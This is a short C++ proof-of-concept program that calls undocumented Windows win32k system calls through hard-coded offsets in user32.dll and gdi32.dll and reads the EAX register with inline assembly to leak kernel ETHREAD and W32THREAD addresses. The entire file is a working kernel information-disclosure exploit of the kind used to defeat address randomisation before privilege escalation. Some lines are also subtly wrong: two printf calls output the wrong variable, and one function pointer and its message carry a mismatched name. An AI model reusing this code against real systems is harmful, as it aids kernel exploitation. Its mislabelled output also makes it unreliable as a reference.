// Syscalls.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include <Winddi.h>

//0x64D4B - NtUserModifyUserStartupInfoFlags
typedef DWORD(NTAPI * lNtUserModifyUserStartupInfoFlags)(DWORD Set, DWORD Flags);
//0xA2F4 - NtUserGetAsyncKeyState
typedef DWORD(NTAPI *lNtUserGetAsyncKeyState)(DWORD key);

//0x47123 - NtGdiFONTOBJ_vGetInfo
typedef VOID(NTAPI * lNtGdiFONTOBJ_vGetInfo)(FONTOBJ *pfo,ULONG cjSize,FONTINFO *pfi);
//0x47263 - NtGdiPATHOBJ_vEnumStartClipLines
typedef VOID(NTAPI * lNtGdiPATHOBJ_vEnumStartClipLines)(PATHOBJ *ppo, CLIPOBJ *pco, SURFOBJ *pso, LINEATTRS *pla);

int main()
{
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		printf("Failed to load user32");
		return 1;
	}

	lNtUserGetAsyncKeyState pNtUserGetAsyncKeyState = (lNtUserGetAsyncKeyState)((DWORD_PTR)hUser32 + 0xA2F4);

	pNtUserGetAsyncKeyState(20);
	unsigned int ethread = 0;
	__asm {
		mov ethread, eax;
	}
	printf("NtUserGetAsyncKeyState ETHREAD partial disclosure: 0x%X\r\n", ethread);
	lNtUserModifyUserStartupInfoFlags pNtUserModifyUserStartupInfoFlags = (lNtUserModifyUserStartupInfoFlags)((DWORD_PTR)hUser32 + 0x64D4B);

	pNtUserModifyUserStartupInfoFlags(20, 12);
	unsigned ethread_full = 0;
	__asm {
		mov ethread_full, eax;
	}
	printf("NtUserModifyUserStartupInfoFlags ETHREAD full disclosure: 0x%X\r\n", ethread_full);

	HMODULE hGDI32 = LoadLibraryA("gdi32.dll");
	if (hGDI32 == NULL) {
		printf("Failed to load gdi32");
		return 1;
	}

	lNtGdiFONTOBJ_vGetInfo pNtGdiEngUnLockSurface = (lNtGdiFONTOBJ_vGetInfo)((DWORD_PTR)hGDI32 + 0x47123);
	FONTOBJ surf = { 0 };
	FONTINFO finfo = { 0 };
	pNtGdiEngUnLockSurface(&surf,123, &finfo);
	long int w32thread = 0;
	__asm {
		mov w32thread, eax;
	}
	printf("NtGdiEngUnLockSurface W32THREAD full disclosure: 0x%X\r\n", ethread);

	lNtGdiPATHOBJ_vEnumStartClipLines pNtGdiPATHOBJ_vEnumStartClipLines = (lNtGdiPATHOBJ_vEnumStartClipLines)((DWORD_PTR)hGDI32 + 0x47263);
	PATHOBJ pathobj = { 0 };
	CLIPOBJ pco = { 0 }; 
	SURFOBJ pso = { 0 };
	LINEATTRS pla = { 0 };
	pNtGdiPATHOBJ_vEnumStartClipLines(&pathobj, &pco, &pso, &pla);
	w32thread = 0;
	__asm {
		mov w32thread, eax;
	}
	printf("NtGdiPATHOBJ_vEnumStartClipLines W32THREAD full disclosure: 0x%X\r\n", ethread);

    return 0;
}

